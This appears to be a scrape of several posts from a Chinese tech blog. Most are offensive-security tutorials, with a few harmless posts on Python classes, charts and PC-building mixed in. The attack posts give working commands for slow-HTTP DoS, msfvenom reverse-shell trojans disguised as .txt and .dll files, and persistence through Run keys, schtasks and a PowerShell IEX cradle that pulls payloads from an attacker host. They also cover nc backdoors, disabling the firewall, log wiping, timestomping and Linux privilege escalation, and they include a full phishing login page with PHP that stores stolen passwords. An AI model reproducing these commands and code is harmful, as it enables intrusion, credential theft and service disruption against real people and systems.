启用日志记录功能，会生成CSV格式的原始数据文件和HTML格式的可视化报告，用于记录攻击过程中的连接状态、响应时间、服务器负载等数据。 -o body_states output prefix（输出文件前缀） 指定日志文件的前缀为body_states，结合-g参数，会生成body_states.csv（数据文件）和body_states.html（可视化报告）两个文件。 -i 110 interval（数据块发送间隔） 指定每次发送请求体数据块之间的时间间隔为110毫秒（ms）。间隔越长，服务器的连接被占用的时间越久，攻击效果越显著。 -r 200 rate（每秒新建连接数） 指定每秒向目标新建200个连接，直到达到-c 2000的并发连接上限（约10秒可达到2000个并发）。 -s 8192 content length size（内容长度） 在HTTP请求头的Content-Length字段中声明预期发送8192字节（8KB）的请求体，欺骗服务器保持连接等待接收完整数据。 -t FAKEVERB HTTP verb（HTTP方法） 指定HTTP请求使用伪造的非标准方法FAKEVERB（正常HTTP方法为GET/POST/PUT等）。此举可尝试绕过部分服务器的防护规则，也用于测试服务器对非标准方法的兼容性。 -u http://[目标ip] URL（目标地址） 指定攻击目标的URL，需将[目标ip]替换为实际的服务器IP或域名。 -x 10 block size（数据块长度） 指定每次向服务器发送的请求体数据块长度为10字节。即每次只发10字节，等待110毫秒后再发下一个10字节，故意拖延请求体的传输速度。 -p 3 probe timeout（探测超时时间） 在发起正式攻击前，工具会先发送一个探测请求检查目标是否可达，若3秒内无响应则判定目标不可达，停止攻击。 原理解析： 发送 POST 请求时，在请求头中声明Content-Length: 8192（要发 8KB 数据），然后以 10 字节 / 110ms 的极慢速度发送请求体，让服务器一直等待接收完整的请求体，从而长期占用连接资源。\nslowloris攻击（针对所有接受 GET 请求的页面，基本通用） 攻击命令：\n1 slowhttptest -c 2000 -H -g -o my_header_states -i 10 -r 1000 -s 8192 -t GET -u http://[目标ip] -x 24 -p 3 原理解析： 发送 GET 请求时，故意 逐个缓慢发送 HTTP 请求头字段 （如Host:、User-Agent:、Accept:等），每个字段大小为 24 字节，发送间隔仅 10ms（看似快，但对服务器的连接处理机制而言，仍足够慢以占用连接），且不发送请求头的结束标记（\\r\\n\\r\\n），让服务器认为请求头还在传输中，从而一直保持连接等待完整的请求头。\n其他内容 驱动级文件保护软件 使用 **Easy File Locker ** 可以对我们的文件进行驱动级的保护和隐藏，当然包括我们放在目标上的木马程序。\n当配置完毕（或我们自己中招）后，我们可以检查下面两个文件夹看看是否真的生效了\nC:/Windows/xlfks.xxx(包括但不限于dat、dll、ini、log\u0026hellip;\u0026hellip;)\nC:/Windows/system32/drivers/xlkfs.sys\n如果检查出上面两个文件就说明是驱动级的文件隐藏\n如何清除：\n查询服务状态sc qc xlkfs 停止服务net stop xlkfs 删除服务sc delete xlkfs 找到上面的两位个文件残余并删除 删除木马程序 注册表自启动 Win+R输入regedit回车打开注册表\n路径一：\n找到路径为HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n路径二：\n找到路径为HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n路径三：\n找到路径为HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n路径四：\n找到路径为HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n路径五：\n找到路径为HKEY_CURRENT_USER\\Environment\n**说明：**路径三、四、五内的条目都是Windows在登录时会执行的任务\n右键新建字符串值，在数据中输入要自启动的文件路径和启动参数\n计划任务启动 1 2 3 schtasks /create /sc minute /mo 1 /tn \u0026#34;示例名称\u0026#34; /tr \u0026#34;powershell.exe -nop -w hidden -c \\\u0026#34;IEX((new-object net.webclient).DownloadString(\\\u0026#34;\\\u0026#34;\\\u0026#34;http://[攻击机ip]/ [木马文件]\u0026#34;\\\u0026#34;\\\u0026#34;\\\u0026#34;))\\\u0026#34;\u0026#34; 上面的代码会让目标每分钟在后台下载并执行攻击者的木马程序\n服务启动 增加一个服务\nsc create \u0026quot;示例名称\u0026quot; binpath= \u0026quot;cmd /c start 具体命令\u0026quot;\n设置服务描述\nsc description 示例名称 \u0026quot;示例描述\u0026quot;\n设置自动启动\nsc config 示例名称 start= auto\n开启服务\nnet start 示例名称\n","date":"2025-12-16T18:07:16+08:00","permalink":"https://www.retr0.xyz/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/","title":"1.14 自启动和DOS攻击初步"},{"content":" 请熟读背诵并严格遵守本条例。\n如果一个设备现在运行得很完美，就不要手贱去调整它。\n不要空腹装机，务必保证开工前有足够的热量摄入。\n不要在夜晚睡前折腾设备，除非你今晚并不打算睡觉。\n新设备装箱前务必在外面做最小系统亮机测试。\n将主板挡板摆在主板旁边最显眼的位置，并在最小系统亮机后第一时间安装。\n务必撕去散热器的保护膜，禁止使用牙膏等物品替代。\n均匀适量涂抹品牌硅脂，禁止涂针脚与底座。\n硅脂应且仅应涂抹在CPU表面，禁止涂针脚与底座。\n防呆并不防傻，禁止大力出奇迹。\n内存应首先选择远离CPU的插槽安装。\n内存数量：宁双不单，宁二不四。\nATX主板装不进ITX机箱，ITX主板也不建议装进ATX机箱。\n使用正规散热器，禁止使用萝卜和水缸等物品代替。\n使用品牌电源，禁止使用红星电源等高爆设备。\n系统应尽量安装在固态硬盘里。\n不要使用玻璃等易碎材质侧板。\n间歇性清灰是必须的，频率取决于设备环境的洁净程度。\n购买设备前务必仔细核对显卡、散热、机箱等配件的长宽高以及各类线材的长度\n显存导热硅片必须使用和原装同样厚度，拆显卡前请复习第1条内容。\n工作空间距离一米内不要放置危险物品，如敞口的水杯、猫。\n水冷有风险，选择需谨慎。\n拆机前应先烤机，并保证散热器轻微扭动取下，避免连根拔起。\n重启解决90%的问题，重装解决99%的问题，重买解决100%的问题。\n电子产品长期来看价格只会越来越低，杜绝“精准下山”的想法。\n备份是最安全且唯一真正安全的数据保存方法。\n如果不擅长空间管理，请保证C盘分区尽量大。\nLinux是个好东西，对于且仅对于会用的人来说。\n不要照抄网上的超频作业，因为每一个元件的“体质”都不一样。\n显卡紧挨的PCIE槽不要插面积大的设备挡风。\n扎带和双面胶有时比螺丝好用。\n机箱不重要，安全的设备安放环境才重要。\n不要给小白组装机，更不要给他提供硬件或软件，让他去买品牌机或者笔记本。\n整机功率应不高于电源标称功率的75%。\n禁止在机箱内摆放熔点低的装饰物。\n涉及重要工作生产内容的设备应配置UPS。\n水洗设备后务必保证完全干燥再通电，水洗前请复习第1条。\n不要用手触摸高速旋转的风扇。\n不要太过热心当好人，也不要试图教育或改变他人。\n快递设备务必拔下显卡和塔扇等设备，并做好填充和包装，允许时使用静电袋。\nRGB灯能显著提升设备性能。\n以上内容为人民群众劳动生产中的智慧结晶， 世界人民大团结万岁！ 来源：图拉丁吧\n","date":"2025-12-16T11:40:47+08:00","permalink":"https://www.retr0.xyz/p/%E8%A3%85%E6%9C%BA%E6%B3%9540%E6%9D%A1-laws-for-computer-assembly/","title":"装机法40条 (Laws for Computer Assembly)"},{"content":"类的定义和使用 前情回顾 在上一节，我们学习了可以用类去封装属性，并基于类创建出一个个的对象来使用，然而实际上类还可以用来封装方法：\n1 2 3 4 class 类名称: 类的属性\t# 类的属性，即定义在类中的变量（成员变量） 类的行为 # 类的行为，即定义在类中的函数（成员方法） 示例：\n1 2 3 4 5 6 7 8 9 10 class Student: name = None age = None def hi(self): print(f\u0026#34;大家好，我是{self.name}\u0026#34;) ########## stu = Student() stu.name = \u0026#39;小明\u0026#39; stu.hi() 从今以后，我们就要称定义在类内部的函数为 方法 了。\n成员方法的定义语法 有些人肯定要问了：“上面的方法的代码里为什么有个self？”\n这就关系到它的定义语法了：\n1 2 def 方法名(self,形参1,形参2,......形参n): 方法体 可以看到,在方法定义的参数列表中,有一个：self 关键字\nself 关键字是成员方法定义的时候，必须填写的。\n它用来表示类对象自身的意思 当我们使用类对象调用方法的是,self会自动被python传入 在方法内部，想要访问类的成员变量，必须使用self（见上方示例） 注意：self关键字虽然在参数列表中，但是传参的时候可以忽略\n例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 class Student: name = None age = None def hi(self): print(f\u0026#34;大家好，我是{self.name}\u0026#34;) def hello(self,msg): print(f\u0026#39;hello,大家好，{msg}\u0026#39;) ###### stu = Student() stu.name = \u0026#39;小王\u0026#39; stu.hi() stu.hello(\u0026#39;很高兴认识大家\u0026#39;)\t# 可以看到此处传参只传给了msg，不用理会self ","date":"2025-12-14T22:06:09+08:00","permalink":"https://www.retr0.xyz/p/s1.2-%E7%B1%BB%E7%9A%84%E6%88%90%E5%91%98%E6%96%B9%E6%B3%95/","title":"S1.2 类的成员方法"},{"content":"隔空植入 前置知识 Windows是如何判断文件类型的？\n是后缀名吗？\n实质上，Windows并不是通过文件的后缀名来判断文件类型的，因为当我们删除了文件的后缀名时，只要能选择合适的软件，一样能正常打开文件。\nWindows是通过文件头来判断文件类型的，当我们使用 HxD 或 c32 等16进制查看器打开文件时可以发现，其编码的开头总是会带上一些特征性的字符，例如：\n这是一个png文件，可以看到很明显的PNG标识\n这是一个exe文件，可以看到MZ、PE的标识\n这是一个rar文件，也是很明显的Rar标识\n这说明后缀名的变化并不影响文件实质作用，他只会影响文用户打开文件的方式。\n换句话说，当一个exe文件的后缀名被改为txt时，Windows会把它 当作 txt文件打开。\n这里拓展一个CMD命令：\n1 copy /b 文件A.jpg+文件B.zip 文件C.jpg 这样就可以把文件A.jpg和文件B.zip的二进制内容合并了，当我们要把它当作图片打开时就取后缀名.jpg当我们要把它当作压缩包打开时就取后缀名.zip这就是有名的 图种 ，其原理正是运用了Windows读取到一种文件头就会判断接下来的内容是什么类型，而合并后的文件具有两个文件头，因此其作为图片或压缩包互不干扰。\n知识运用 txt伪装木马 知道了上面的知识，我们是否可以生成一个后缀名为.txt但实质为.msi类型的木马呢？让我们试一试。\n打开Kali攻击机：\n1 msfvenom -p windows/x64/shell/reverse_tcp lhost=[攻击机ip] lport=4444 -f msi \u0026gt;msi.txt 接下来我们把它放到我们上一节学习到web目录中进行隔空植入\n所以现在我们只需要在目标机器上执行这一句话就可以了\n1 2 3 msiexec /q /i http://192.168.80.133/msi.txt 或 forfiles /p c:\\windows\\system32 /m cmd.exe /c \u0026#34;msiexec /q /i http://192.168.80.133/msi.txt\u0026#34; dll类型木马 1 msfvenom -p windows/x64/shell/reverse_tcp lhost=[攻击机ip] lport=4444 -f dll \u0026gt;hello.dll 被控端执行：\n1 2 3 msiexec /y hello.dll 或 rundll32.eex shell32.dll,Control_RunDLL ./hello.dll pstools 当你曾经通过木马入侵了一个主机并获取了管理员或其他某个账户的密码后，某天木马突然失效，你将如何重新侵入之前的主机呢？\n使用微软官方的系统插件pstools\n准备工作 目标主机的防火墙最好关闭 创建/获得对方计算机的用户名和密码 如何操作 找到并解压win10攻击机的C:\\tools\\alltools\\远程连接\\PSTools.zip\n在解压后的目录启动CMD\n1 psexec \\\\[目标ip] -u [用户名] -p [密码] cmd.exe 可以看到直接连接上了对方电脑的cmd（话说有点像ssh）\n还可以让对方运行我们电脑里的exe文件\n1 psexec \\\\[目标ip] -u [用户名] -p [密码] -c c:\\nc.exe 如果要对方运行它电脑里的exe\n1 psexec \\\\[目标ip] -u [用户名] -p [密码] -d notepad.exe 还可以尝试提权（以system权限运行程序）\n1 psexec \\\\[目标ip] -u [用户名] -p [密码] -c -s c:\\nc.exe 特殊情况 如果我们入侵的主机有下面的情况要怎么办：\n当前电脑硬盘不能用（无盘工作站） 自己权限不高 在目标上运行你C盘里的文件\n1 2 3 pcalua -m -a \\\\[攻击机ip]\\c$\\xx.eex 或 rundll32.exe zipfldr.d11,RouteTheCall \\\\[攻击机]\\c$\\xx. exe ","date":"2025-12-14T18:18:13+08:00","permalink":"https://www.retr0.xyz/p/1.13-%E6%9B%B4%E5%A4%9A%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F/","title":"1.13  更多木马程序"},{"content":" 本篇内容使用win7-sp1靶机，请在资源库中自行下载导入\n进阶后门操作 复习 进入kali后若想要连接此前已经设置好的后门：\n通过服务启动 1 2 3 4 5 use exploit/multi/handler setpayload windows/metsvc_bind_tcp set lport 31337 set rhost [目标ip] run 永久性后门 1 2 3 4 5 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lport 4321 set lhost [自己ip] run 植入备用后门 上传文件 我们从【win10攻击机】中取nc.exe复制到kali中的kali文件夹，\n回到meterpreter终端：\n1 upload /home/kali/nc.exe c:\\\\ 将nc.exe上传到对方的C盘\n修改注册表 查看对方开机自启的配置\n1 reg enumkey -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run 为了防止meterpreter失效，接下来我们要把nc放到对方的自动启动里当作后门\n1 reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v nc -d \u0026#39;c:\\nc.exe -ldp 444 -e cmd.exe\u0026#39; 这句话的意思是开机时启动nc并且执行后面的命令使它监听444端口，如果监听到连接就返回一个cmd命令行\n使用下面的命令可用查看刚才写的注册表条目详细信息\n1 reg queryval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v nc 控制防火墙 直接关闭 因为中文乱码的缘故不方便查看防火墙的状态，所以我们都直接执行一遍防火墙关闭命令就可以了\n1 2 shell netsh advfirewall set allprofiles state off 增加规则 为了防止关闭防火墙引起对方怀疑，我们也可以使用增加一条允许444端口的规则的方法\n1 2 shell netsh firewall add portopening TCP 444 \u0026#34;FireWall\u0026#34; ENABLE ALL 使用nc连接 现在我们重启一下靶机，重启后用nc连接看看是否成功\n1 nc -v [目标ip] 444 缺点 上面的操作中修改注册表的内容可以在msconfig里查到，所以我们可以考虑使用自解压的方式进行伪装\n远程下载木马 启动apache 1 service apache2 start apache的目录位于/var/www/html/中，我们可以在里面放上木马文件\n方法一：使用vbs下载文件 用echo命令创建a.vbs\n1 2 3 4 echo set a=createobject(\u0026#34;adod\u0026#34;+\u0026#34;b.stream\u0026#34;):set w=createobject(\u0026#34;micr\u0026#34;+\u0026#34;osoft.xmlhttp\u0026#34;):w.open\u0026#34;get\u0026#34;,wsh.arguments( 0), 0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments( 1),2 \u0026gt;\u0026gt; a.vbs 也可以使用中间的代码手动创建\n然后在cmd中执行下面的命令即可将木马保存到c盘 （对exe效果可能不好，适合文字脚本类）\n1 cscript a.vbs http://[攻击机ip]/木马文件名 c:\\木马文件名 方法二：使用certutil下载文件 在cmd中执行 （这个也不适合exe等大文件）\n1 certutil -urlcache -split -f http://[攻击机ip]/木马文件名 文件会下载到本目录（cmd打开的地方）\n弊端：每次下载会留下入侵痕迹，所以要进行痕迹清理，方法如下\n1 certutil -urlcache -split -f http://[攻击机ip]/木马文件名 delete 拓展：certutil的其他功能\n校验hash值：\n1 certutil -hashfile [文件路径及名称，例如c:\\hi.exe] 加密解密文件（虽然不带密钥而且可逆我也不知道为什么配叫加密）：\n1 2 3 4 # 加密 certutil -encode c:\\a.txt c:\\b.txt # 解密 certutil -decode c:\\b.txt c:\\a.txt 方法三：使用bitsadmin下载文件 在cmd中执行\n1 2 bitsadmin /rawreturn /transfer down http://[攻击机ip]/木马文件名 [保存路径及文件名] # 例如 bitsadmin /rawreturn /transfer down http://192.168.80.133/1.txt c:\\1.txt 方法三：使用js下载文件 新建a.js文件\n1 2 3 var WinHttpReq = new ActiveXObject(\u0026#34;WinHttp.WinHttpRequest.5.1\u0026#34;); WinHttpReq.Open(\u0026#34;GET\u0026#34;,WScript.Arguments(0),/*async =* /false);WinHttpReq.Send(); WScript.Echo(WinHttpReq.ResponseText); 在同目录cmd中执行\n1 cscript /nologo a.js http://192.168.80.133/1.txt \u0026gt;\u0026gt; 123.txt meterpreter操作补充 禁用键盘/鼠标 禁用\tuictl disable keyboard或mouse\n启用 uictl enable keyboard或mouse\n摄像头 webcam_list\t查看摄像头\nwebcam_snap\t通过摄像头拍照\nwebcam_stream\t通过摄像头开启视频\n程序相关 execute 在目标上面执行程序\nexecute -H -i -f cmd.exe 后台执行程序\ngetpid 获取当前进程pid\nps\t查看活跃进程\nmigreate [pid]\t把meterpreter转移到某个pid\nkill [pid]\t杀掉某个进程\n反侦察 clearev\t一键清除日志\ntimestomp -v c://a.exe\t查看c盘a.exe的时间戳\ntimestomp -v c://b.exe c://a.exe\t将a.exe的修改时间复制给b.eex\n","date":"2025-12-13T17:17:58+08:00","permalink":"https://www.retr0.xyz/p/1.12-%E8%BF%9B%E9%98%B6%E5%90%8E%E9%97%A8%E6%93%8D%E4%BD%9C/","title":"1.12 进阶后门操作"},{"content":"为区分第二部分和第一部分的标题，所有第二部分的教程序号前将会加上 S (second)\n使用对象组织数据 情景导入：生活中当我们需要收集信息时，往往会设计、生产表格供他人填写，而不是给别人一张白纸任其随意书写，因为那样收集来的数据格式各种各样，高度不统一。\n在程序中我们也是可以做到像生活中那样，设计表格、生产表格、填写表格的组织形式的。\n基本定义 在程序中设计表格，我们称之为：设计 类（class） 1 2 class Student: name = None\t# 定义变量，记录学生姓名 在程序中打印生产表格，我们称之为：创建 对象 1 2 3 # 基于类创建对象 stu_1 = Student() stu_2 = Student() 在程序中填写表格，我们称之为：对象属性赋值 1 2 stu_1.name = \u0026#34;小明\u0026#34;\t# 为学生1对象赋予名称属性值 stu_2.name = \u0026#34;小华\u0026#34;\t# 为学生2对象赋予名称属性值 QuickStart：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 class Student: name = None gender = None age = None area = None stu_1 = Student() stu_1.name = \u0026#39;小明\u0026#39; stu_1.gender = \u0026#39;男\u0026#39; stu_1.age = 22 stu_1.area = \u0026#39;江苏\u0026#39; print(stu_1.name) print(stu_1.gender) print(stu_1.age) print(stu_1.area) 总结： 对象的存在使得我们曾经认识的那个只能赋值一个值的变量如今可以拥有多个属性，例如曾经我们使用name='retr0'和age=18两个变量才能基本记录一个人，而如今我们只要设计好类并创建对象就可以通过person1.name='retr0'和person1.age=18同一个变量记录这些数据。\n","date":"2025-12-11T22:36:17+08:00","permalink":"https://www.retr0.xyz/p/s1.1-%E5%88%9D%E8%AF%86%E5%AF%B9%E8%B1%A1/","title":"S1.1 初识对象"},{"content":"提权(续) 以下命令除非特别指出，均在ssh中执行\n寻找敏感的隐藏文件\n1 find / -name \u0026#34;.*\u0026#34; -type f -path \u0026#34;/home/*\u0026#34; -exec ls -al {} \\; 2\u0026gt;/dev/null 有可能找到用户自己存储的明文密码，使用cat查看，再使用su [用户名]切换到对应权限\nSID提权 输入以下命令查看可以使用的命令\n1 find / -perm -4000 -type f -exec ls -al {} \\; 可以看到/usr/bin/xxd，接着使用下面的命令查看加密后的密码\n1 xxd /etc/shadow | xxd -r 复制其中root账户的全部内容（从root:到:::）保存为txt（以Desktop/pass.txt为例）\n接着使用破解工具 john 进行字典破解（字典可能打包了，需要手动解压一下）\n1 2 cd Desktop/ john pass.txt -w=/usr/share/wordlists/rockyou.txt NFS提权 注意：本小节的大部分命令在本机中执行\n扫描目标服务器端口\n1 nmap [目标ip] 发现对方可能开启了2049端口，接着查看对方挂载了哪些文件夹\n返回：/home/peter *\n1 showmount -e [目标ip] 接着我们在自己的系统上打开终端创建一个文件夹方便将对方的文件夹挂载到自己的系统上，具体操作如下 （需要使用root权限执行） ：\n1 2 3 4 5 cd /tmp mkdir nfs cd nfs mount -t nfs [对方ip]:[对方挂载的文件夹] /tmp/nfs/ ls -la # 查看里面有什么文件夹 接下来我们想要把自己的bash复制到这个这个挂载的文件夹里面去，从而实现提权，但是直接copy会提示 权限不够 （因为我们系统上的root在对方看来只是一个低权限的外人），所以我们要伪造一个和对方一模一样的账户 peter\n在ssh中执行cat /etc/passwd，找到peter这一行，后面跟有两串数字，第一个是uid第二个是gid，所以我们执行：\n1 2 groupadd -g 1005 peter\t# 创建组，名为peter，gid为1005 add user peter -uid 1001 -gid 1005\t# 创建名为peter，uid为1001的用户，并添加到gid为1005的组中 接下来我们需要使用.ssh方法提权\n1 2 3 4 5 6 7 cd ~\t# 转到本机的peter目录下 ssh-keygen\t# 生成ssh密钥，并记住.pub文件的名称 cd /tmp/nfs mkdir .ssh cat ~/.ssh/[文件名].pub \u0026gt; ./.ssh/authorized_keys\t# 将我们伪造的密钥放入对方的可信密钥文件夹 cd ~/.ssh ssh -i [文件名] peter@[目标ip] 发现成功免密码以peter身份登录靶机，我们在ssh中执行sudo -l查看可以免密码以root身份执行哪些命令，返回(ALL) NOPASSWD: /usr/bin/strace，发现strace可以使用\n所以我们使用如下命令提权：\n1 sudo strace -o /dev/null /bin/sh docker提权 1 docker run -v /:/hostOS -i -t chrisfoseterelli/rootplease 钓鱼网站 功能介绍：使用网站克隆工具或手敲仿写一个正规网站的登陆页面，并且实现点击登陆后保存密码到服务端本地的txt文件中，同时强制伪加载几秒，然后跳转到正规网站上，给使用者一种没有登陆上是因为网卡了的原因。\n为了方便演示，本项目分为多个文件。\nindex.html注意修改 第187行 的跳转链接 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;用户登录\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; /* 原有登录页面样式 */ body { font-family: \u0026#34;Helvetica Neue\u0026#34;, Helvetica, Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; position: relative; /* 为加载层定位做准备 */ } .login-container { background-color: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 350px; text-align: center; position: relative; z-index: 1; /* 确保登录框在加载层下方 */ } .logo-area { margin-bottom: 30px; color: #1677ff; /* 支付宝蓝风格 */ font-size: 24px; font-weight: bold; } .input-group { margin-bottom: 20px; text-align: left; } .input-group label { display: block; margin-bottom: 5px; color: #666; font-size: 14px; } .input-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; /* 确保padding不撑大宽度 */ outline: none; } .input-group input:focus { border-color: #1677ff; } .submit-btn { width: 100%; padding: 12px; background-color: #1677ff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; transition: background-color 0.3s; } .submit-btn:hover { background-color: #0e5fd8; } .footer-links { margin-top: 20px; font-size: 12px; color: #888; } /* 加载动画样式 */ .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.5); /* 半透明遮罩 */ display: flex; justify-content: center; align-items: center; z-index: 9999; /* 确保加载层在最上层 */ opacity: 0; visibility: hidden; transition: opacity 0.3s, visibility 0.3s; } .loading-overlay.active { opacity: 1; visibility: visible; } .loading-card { background-color: white; padding: 30px 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2); display: flex; align-items: center; gap: 15px; } .loading-spinner { width: 30px; height: 30px; border: 3px solid #e0e0e0; border-top: 3px solid #1677ff; /* 支付宝蓝主色 */ border-radius: 50%; animation: spin 1s linear infinite; } .loading-text { font-size: 16px; color: #1677ff; font-weight: 500; } @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } /* 响应式适配 */ @media (max-width: 480px) { .login-container { width: 90%; padding: 30px 20px; } .loading-card { padding: 20px 30px; flex-direction: column; text-align: center; } } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- 登录容器 --\u0026gt; \u0026lt;div class=\u0026#34;login-container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;logo-area\u0026#34;\u0026gt;XX支付中心\u0026lt;/div\u0026gt; \u0026lt;form id=\u0026#34;loginForm\u0026#34; action=\u0026#34;login.php\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;input-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;username\u0026#34;\u0026gt;账号 / 手机号\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;username\u0026#34; name=\u0026#34;username\u0026#34; placeholder=\u0026#34;请输入账号\u0026#34; required\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;input-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;password\u0026#34;\u0026gt;登录密码\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;password\u0026#34; name=\u0026#34;password\u0026#34; placeholder=\u0026#34;请输入密码\u0026#34; required\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;submit-btn\u0026#34;\u0026gt;登 录\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div class=\u0026#34;footer-links\u0026#34;\u0026gt; 找回密码 | 注册新账号 \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 加载动画层 --\u0026gt; \u0026lt;div class=\u0026#34;loading-overlay\u0026#34; id=\u0026#34;loadingOverlay\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;loading-card\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;loading-spinner\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;loading-text\u0026#34;\u0026gt;正在登录...\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; // 获取元素 const loginForm = document.getElementById(\u0026#39;loginForm\u0026#39;); const loadingOverlay = document.getElementById(\u0026#39;loadingOverlay\u0026#39;); // 监听表单提交事件 loginForm.addEventListener(\u0026#39;submit\u0026#39;, function(e) { // 阻止默认的表单提交行为（因为要等6秒再跳转） e.preventDefault(); // 先验证表单（HTML5 required验证） const isValid = loginForm.checkValidity(); if (isValid) { // 验证通过，显示加载动画 loadingOverlay.classList.add(\u0026#39;active\u0026#39;); // 6秒后跳转到welcome.php setTimeout(function() { window.location.href = \u0026#39;要跳转的网页链接\u0026#39;; }, 6000); fetch(\u0026#39;login.php\u0026#39;, { method: \u0026#39;POST\u0026#39;, body: new FormData(loginForm) }).then(response =\u0026gt; { console.log(\u0026#39;表单数据已提交\u0026#39;); }).catch(error =\u0026gt; { console.error(\u0026#39;表单提交失败:\u0026#39;, error); // 提交失败时隐藏加载动画并提示 loadingOverlay.classList.remove(\u0026#39;active\u0026#39;); alert(\u0026#39;登录请求提交失败，请重试\u0026#39;); }); } }); // 防止点击加载遮罩层关闭动画 loadingOverlay.addEventListener(\u0026#39;click\u0026#39;, function(e) { e.stopPropagation(); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; login.php 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php session_start(); require_once \u0026#39;db.php\u0026#39;; // 仅处理POST请求 if ($_SERVER[\u0026#34;REQUEST_METHOD\u0026#34;] == \u0026#34;POST\u0026#34;) { // 获取用户输入（trim去除首尾空格，避免空值插入） $user_input = trim($_POST[\u0026#39;username\u0026#39;]); $pass_input = trim($_POST[\u0026#39;password\u0026#39;]); // 验证输入不为空（可选，按需求保留/删除） if (empty($user_input) || empty($pass_input)) { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;用户名或密码不能为空！\u0026#39;); window.history.back();\u0026lt;/script\u0026gt;\u0026#34;; exit; } $txt = $user_input.\u0026#39;-------\u0026#39;.$pass_input.\u0026#39;\\n\u0026#39;; $file = fopen(\u0026#34;./hh.txt\u0026#34;,\u0026#34;a+\u0026#34;); fwrite($file,$txt); fclose(); } $conn-\u0026gt;close(); ?\u0026gt; 在网站目录中创建一个hh.txt（名称也可以在login.php中修改），登录提交的密码就会保存到该txt文件中 ","date":"2025-12-11T14:32:18+08:00","permalink":"https://www.retr0.xyz/p/1.11-linux%E6%8F%90%E6%9D%83%E7%BB%AD%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/","title":"1.11 Linux提权(续)和钓鱼网站"},{"content":"基础柱状图 通过 Bar 构建基础柱状图\n快速上手 Quickstart：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 from pyecharts.charts import Bar from pyecharts.options import * # 构建柱状图对象 bar = Bar() # 添加x轴数据 bar.add_xaxis([\u0026#34;中国\u0026#34;,\u0026#34;美国\u0026#34;,\u0026#34;英国\u0026#34;]) # 添加y轴数据 bar.add_yaxis(\u0026#34;GDP\u0026#34;,[30,20,10], label_opts=LabelOpts(position=\u0026#34;right\u0026#34;)) # 反转xy轴 bar.reversal_axis() # 绘图 